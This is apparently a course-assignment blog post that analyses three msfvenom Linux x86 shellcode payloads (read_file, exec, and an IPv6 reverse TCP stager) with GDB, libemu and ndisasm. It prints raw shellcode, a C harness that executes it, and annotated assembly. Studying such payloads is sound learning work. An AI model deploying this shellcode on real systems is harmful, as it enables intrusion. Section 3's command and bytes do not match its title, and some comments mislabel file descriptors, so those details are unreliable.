---
layout: post
title: SLAE Assignment 5 - msfvenom Shellcode Analysis
date: '2016-12-07T21:40:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- msfvenom
comments: true
---

### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 5 Requirements
- Take 3 shellcode samples created with msfvenom for Linux x86.
- Use GDB, Ndiasm and Libemu to dissect the functionality of the shellcode.
- Present your analysis of the shellcode.


### msfvenom Shellcode
The following shellcodes and corresponding debugging methods have been selected:

1\. `linux/x86/shell/read_file` - GDB <br>
2\. `linux/x86/exec` - Libemu <br>
3\. `linux/x86/shell/reverse_ipv6_tcp` - Ndiasm <br>


### 1. read_file Payload Creation
Creating a payload for `linux/x86/shell/read_file` in C format.

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment5$ msfvenom -p linux/x86/read_file PATH=/home/skawa/Desktop/code/assignment/assignment5/testFile.txt -f c -a x86 --platform linux
No encoder or badchars specified, outputting raw payload
Payload size: 122 bytes
Final size of c file: 539 bytes
unsigned char buf[] =
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x68\x6f\x6d\x65\x2f\x73\x6b\x61\x77\x61\x2f\x44\x65"
"\x73\x6b\x74\x6f\x70\x2f\x63\x6f\x64\x65\x2f\x61\x73\x73\x69"
"\x67\x6e\x6d\x65\x6e\x74\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65"
"\x6e\x74\x35\x2f\x74\x65\x73\x74\x46\x69\x6c\x65\x2e\x74\x78"
"\x74\x00";
skawa@ubuntu:~/Desktop/code/assignment/assignment5$
~~~


The contents of `testFile.txt` are:

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat testFile.txt
Hi SecurityTube
skawa@ubuntu:~/Desktop/code/assignment/assignment5$
~~~

#### GDB Disassembly
The first thing to do is create an executable binary so that the program can be compiled then attached and debugged in GDB.

~~~ c
skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat read-file-shellcode.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x68\x6f\x6d\x65\x2f\x73\x6b\x61\x77\x61\x2f\x44\x65"
"\x73\x6b\x74\x6f\x70\x2f\x63\x6f\x64\x65\x2f\x61\x73\x73\x69"
"\x67\x6e\x6d\x65\x6e\x74\x2f\x61\x73\x73\x69\x67\x6e\x6d\x65"
"\x6e\x74\x35\x2f\x74\x65\x73\x74\x46\x69\x6c\x65\x2e\x74\x78"
"\x74\x00";

main()
{
  printf("Shellcode Length: %d\n", strlen(code));

  int (*ret)() = (int(*)())code;
  ret();
}
skawa@ubuntu:~/Desktop/code/assignment/assignment5$ ./c-compile.sh read-file-shellcode
[+] Compiling Shellcode
[+] Done!
skawa@ubuntu:~/Desktop/code/assignment/assignment5$
~~~

Next, a break point can be set on the `code` variable as this is where the shellcode for the `read_file` payload begins.

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment5$ gdb -q ./read-file-shellcode
Reading symbols from /home/skawa/Desktop/code/assignment/assignment5/read-file-shellcode...(no debugging symbols found)...done.
(gdb) break *&code
Breakpoint 1 at 0x804a040
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment5/read-file-shellcode
Shellcode Length: 4

Breakpoint 1, 0x0804a040 in code ()
(gdb) disas
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	jmp    0x804a078 <code+56>
   0x0804a042 <+2>:	mov    eax,0x5
   0x0804a047 <+7>:	pop    ebx
   0x0804a048 <+8>:	xor    ecx,ecx
   0x0804a04a <+10>:	int    0x80
   0x0804a04c <+12>:	mov    ebx,eax
   0x0804a04e <+14>:	mov    eax,0x3
   0x0804a053 <+19>:	mov    edi,esp
   0x0804a055 <+21>:	mov    ecx,edi
   0x0804a057 <+23>:	mov    edx,0x1000
   0x0804a05c <+28>:	int    0x80
   0x0804a05e <+30>:	mov    edx,eax
   0x0804a060 <+32>:	mov    eax,0x4
   0x0804a065 <+37>:	mov    ebx,0x1
   0x0804a06a <+42>:	int    0x80
   0x0804a06c <+44>:	mov    eax,0x1
   0x0804a071 <+49>:	mov    ebx,0x0
   0x0804a076 <+54>:	int    0x80
   0x0804a078 <+56>:	call   0x804a042 <code+2>
   0x0804a07d <+61>:	das    
   0x0804a07e <+62>:	push   0x2f656d6f
   0x0804a083 <+67>:	jae    0x804a0f0
   0x0804a085 <+69>:	popa   
   0x0804a086 <+70>:	ja     0x804a0e9
   0x0804a088 <+72>:	das    
   0x0804a089 <+73>:	inc    esp
   0x0804a08a <+74>:	gs
   0x0804a08b <+75>:	jae    0x804a0f8
   0x0804a08d <+77>:	je     0x804a0fe
   0x0804a08f <+79>:	jo     0x804a0c0 <dtor_idx.6161>
   0x0804a091 <+81>:	arpl   WORD PTR [edi+0x64],bp
   0x0804a094 <+84>:	gs
   0x0804a095 <+85>:	das    
   0x0804a096 <+86>:	popa   
   0x0804a097 <+87>:	jae    0x804a10c
   0x0804a099 <+89>:	imul   esp,DWORD PTR [edi+0x6e],0x746e656d
   0x0804a0a0 <+96>:	das    
   0x0804a0a1 <+97>:	popa   
   0x0804a0a2 <+98>:	jae    0x804a117
   0x0804a0a4 <+100>:	imul   esp,DWORD PTR [edi+0x6e],0x746e656d
   0x0804a0ab <+107>:	xor    eax,0x7365742f
   0x0804a0b0 <+112>:	je     0x804a0f8
   0x0804a0b2 <+114>:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x747874
   0x0804a0ba <+122>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb)
~~~


#### JMP CALL pop
The first instruction jumps to a procedure located at `0x804a078`. This procedure then performs a `call` instruction to a procedure located at the second instruction. Right after the `call` instruction is made, the address of the next instruction `0x0804a07d` is placed on the stack. This contains the location of the file which is going to be read `"/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"`

~~~ nasm
(gdb) x/4bx $esp
0xbffff628:	0x7d	0xa0	0x04	0x08
(gdb)
(gdb) x/1s 0x0804a07d
0x804a07d <code+61>:	 "/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"
(gdb)
~~~


#### Interrupt 1 - Open
The first chunk of instructions are responsible for opening the file.

~~~ nasm
mov eax,0x5     ;open system call, 5
pop ebx         ;pop the location of the file, 0x0804a07d, into EBX
xor ecx,ecx     ;zero out ecx
0x80            ;execute open
~~~


#### Interrupt 2 - Read
The second chunk of instructions are responsible for reading the file.

~~~ nasm
mov ebx,eax     ;arg 1, the file descriptor that is return by the open syscall
mov eax,0x3     ;read system call, 3
mov edi,esp     ;preserve the stack pointer in EDI
mov ecx,edi     ;arg 2, ECX points to the stack
mov edx,0x1000  ;set 4096 bytes to read
int 0x80        ;execute read system call
~~~


#### Interrupt 3 - Write
The third chunk of instructions are responsible for writing the contents of the file to screen.

~~~ nasm
mov edx,eax  ;arg 3, the file descriptor that is return by the read syscall
mov eax,0x4  ;write system call, 4
mov ebx,0x1  ;arg 2, write to STDIN (screen)
int 0x80     ;execute write system call
~~~


#### Interrupt 4 - Exit
The last chunk of instructions are responsible for exiting the program

~~~ nasm
mov eax,0x1 ;exit
mov ebx,0x0 ;arg 1, value 0
int 0x80    ;execute exit system call
~~~



### 2. exec Payload Creation
Libemu is a fantastic emulator that can help with running and disassembling shellcode in to meaningful segments and instructions.

The example shellcode below is the `linux/x86/exec` payload part of `msfvenom`.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000
verbose = 3
No encoder or badchars specified, outputting raw payload
Payload size: 44 bytes

<snippet>

int execve (
     const char * dateiname = 0x00416fc0 =>
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 =>
               = 0x00416fc0 =>
                   = "/bin/sh";
           = 0x00416fb4 =>
               = 0x00416fc8 =>
                   = "-c";
           = 0x00416fb8 =>
               = 0x0041701d =>
                   = "ifconfig";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
skawa@ubuntu:~/libemu/tools/sctest$
~~~

In addition to displaying the code above, libemu is also able to create a graphical representation of all  instructions and system interrupts that exist in the emulated program.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000 -G execve.dot
skawa@ubuntu:~/libemu/tools/sctest$dot execve.dot -T png -o execve.png
skawa@ubuntu:~/libemu/tools/sctest$
~~~

<img src ="https://github.com/skahwah/skahwah.github.io/blob/master/_data/slae-assignment-5.png?raw=true" />

#### Dissecting the Instructions
~~~ nasm
push byte 0xb         ;push 11 on to the stack
pop eax               ;execve syscall, 11
cwd
push edx              ;push null terminator on to the stack
push word 0x632d      ;push -c
mov edi, esp          ;preserve stack pointer in EDI
push dword 0x68732f   ;next two instructions push /bin/sh
push dword 0x6e69622f
mov ebx, esp          ;move stack pointer in ESP
push edx              ;push null terminator on to the stack
call 0x1              ;get the custom command, ifcondig
push edi              ;stack address restored
push ebx              ;filename /bin/sh
mov ecx, esp          ;ECX contains all arguments for execve
int 0x80              ;execute execve syscall
~~~



### 3. reverse_ipv6_tcp Payload Creation
Creating a payload for `linux/x86/shell/reverse_ipv6_tcp` in C format.

~~~ bash
skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell/bind_ipv6_tcp LHOST=::1 -f c -a x86 --platform linux
No encoder or badchars specified, outputting raw payload
Payload size: 120 bytes
Final size of c file: 528 bytes
unsigned char buf[] =
"\x6a\x7d\x58\x99\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\x66\x81"
"\xe3\x00\xf0\xcd\x80\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x0a\x89"
"\xe1\xb0\x66\xcd\x80\x51\x6a\x04\x54\x6a\x02\x6a\x01\x50\x97"
"\x89\xe1\x6a\x0e\x5b\x6a\x66\x58\xcd\x80\x97\x83\xc4\x14\x59"
"\x5b\x5e\x6a\x02\x5b\x52\x52\x52\x52\x52\x52\x68\x0a\x00\x11"
"\x5c\x89\xe1\x6a\x1c\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\xd1"
"\xe3\xb0\x66\xcd\x80\x50\x43\xb0\x66\x89\x51\x04\xcd\x80\x93"
"\xb6\x0c\xb0\x03\xcd\x80\x87\xdf\x5b\xb0\x06\xcd\x80\xff\xe1";
skawa@ubuntu:~/libemu/tools/sctest$
~~~


#### ndisasm Disassembly

ndisasm can be used to disassemble the shellcode into meaningful assembly instructions.

~~~ nasm
skawa@ubuntu:~/libemu/tools/sctest$ echo -ne "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96\x99\x68\x00\x00\x00\x00\x68\x00\x00\x00\x01\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x52\x66\x68\x11\x5c\x66\x68\x0a\x00\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x89\xf3\xb6\x0c\xb0\x03\xcd\x80\x89\xdf" | ndisasm -u -
00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  43                inc ebx
00000004  53                push ebx
00000005  6A0A              push byte +0xa
00000007  89E1              mov ecx,esp
00000009  6A66              push byte +0x66
0000000B  58                pop eax
0000000C  CD80              int 0x80
0000000E  96                xchg eax,esi
0000000F  99                cdq
00000010  6800000000        push dword 0x0
00000015  6800000001        push dword 0x1000000
0000001A  6800000000        push dword 0x0
0000001F  6800000000        push dword 0x0
00000024  6800000000        push dword 0x0
00000029  52                push edx
0000002A  6668115C          push word 0x5c11
0000002E  66680A00          push word 0xa
00000032  89E1              mov ecx,esp
00000034  6A1C              push byte +0x1c
00000036  51                push ecx
00000037  56                push esi
00000038  89E1              mov ecx,esp
0000003A  43                inc ebx
0000003B  43                inc ebx
0000003C  6A66              push byte +0x66
0000003E  58                pop eax
0000003F  CD80              int 0x80
00000041  89F3              mov ebx,esi
00000043  B60C              mov dh,0xc
00000045  B003              mov al,0x3
00000047  CD80              int 0x80
00000049  89DF              mov edi,ebx
skawa@ubuntu:~/libemu/tools/sctest$
~~~

Looking at the disassembly above, there are three system call interrupts.

#### Interrupt 1 - Socket Creation
The first chunk of instructions are responsible for creating a IPv6 socket.

~~~ nasm
xor ebx,ebx     ;clear out ebx
push ebx        ;socket protocol 0x0 is moved on to the stack
inc ebx         ;socketcall type, socket
push ebx        ;socket type 1, SOCK_STREAM, is moved on to the stack
push byte +0xa  ;push socket type 10 (INET6) on to the stack
mov ecx,esp     ;all arguments for socket, as required by socketcall are pointed to by ECX
push byte +0x66 ;push 102 onto the stack (socketcall)
pop eax         ;socketcall syscall
int 0x80        ;execute socketcall
~~~


#### Interrupt 2 - Connect
The second chunk of instructions are responsible for creating an IPv6 connect structure.

~~~ nasm
xchg eax,esi          ;place socket file descriptor into ESI. Also clear out EAX.
cdq

;populate the stack with the arguments for the sockaddr_in structure
push dword 0x0        ;ipv6 localhost pushed on to the stack
push dword 0x1000000  ;ipv6 localhost pushed on to the stack
push dword 0x0        ;ipv6 localhost pushed on to the stack
push dword 0x0        ;ipv6 localhost pushed on to the stack
push dword 0x0        ;ipv6 localhost pushed on to the stack
push edx
push word 0x5c11      ;sin_port 4444 pushed on to the stack
push word 0xa         ;sin_family, INET6, which is 10 pushed on to the stack

mov ecx,esp           ;the stack pointer to the sockaddr_in structure is moved into ecx
push byte +0x1c       ;push connect addrlen to the stack, the length of the struct
push ecx              ;the stack pointer to the sockaddr_in structure pushed on to the stack
push esi              push connect sockfd to the stack, this is the value of the file descriptor returned to socket
mov ecx,esp           ;update ecx to the stack pointer which currently contains a pointer to "sockfd, sockaddr_in, addrlen". All arguments for connect, as required by socketcall are pointed to by ECX
inc ebx               ;ebx now contains 2
inc ebx               ;ebx now contains 3, for the type of socketcall, which is connect
push byte +0x66       ;push 102 onto the stack (socketcall)
pop eax               ;socketcall syscall
int 0x80              ;execute connect
~~~


#### Interrupt 3 - Read
The last chunk of instructions are responsible for creating the read system call.

~~~ nasm
mov ebx,esi         ;move the socket file descriptor into EBX
mov dh,0xc          
mov al,0x3          ;read syscall
int 0x80            ;execute read
~~~
